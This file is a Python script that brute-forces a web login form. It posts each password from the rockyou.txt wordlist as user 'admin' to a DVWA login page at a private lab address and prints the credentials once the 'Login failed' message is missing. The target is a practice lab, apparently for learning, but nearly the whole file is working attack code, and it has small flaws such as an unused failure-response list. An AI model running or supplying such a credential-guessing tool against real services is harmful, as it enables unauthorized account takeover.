#!/usr/bin/env python
# working

import requests
import sys
from termcolor import colored

# create the bruteforce function
def bruteforce(username, url, login_responses):
    for line in wordlist_file:
        word = line.strip()
        print("\r[!] Trying to bruteforce with password: " + word),
        sys.stdout.flush() 
        data_dict["password"] = word
        response = requests.post(target_url, data = data_dict)
        for failed_response in login_responses:
            if "Login failed" not in response.content:
                print(colored("\n[+] Username: %s" % username, 'green'))
                print(colored("[+] Password: %s" % word, 'red'))
                exit()

    print("[+] Reached end of line. Try another wordlist")


# import the target url method
target_url = "http://10.0.2.5/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}

# possible login failure responses
login_failure = ["Login failed", "Incorrect password"]

wordlist = "/home/Mitch/Documents/Password_Cracking/Wordlists/rockyou.txt"
# wordlist = "/home/Mitch/Documents/Password_Cracking/Wordlists/test_wordlist.txt"
try:
    with open(wordlist, "r") as wordlist_file:
        bruteforce(data_dict["username"], target_url, login_failure)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ... Exiting program...")


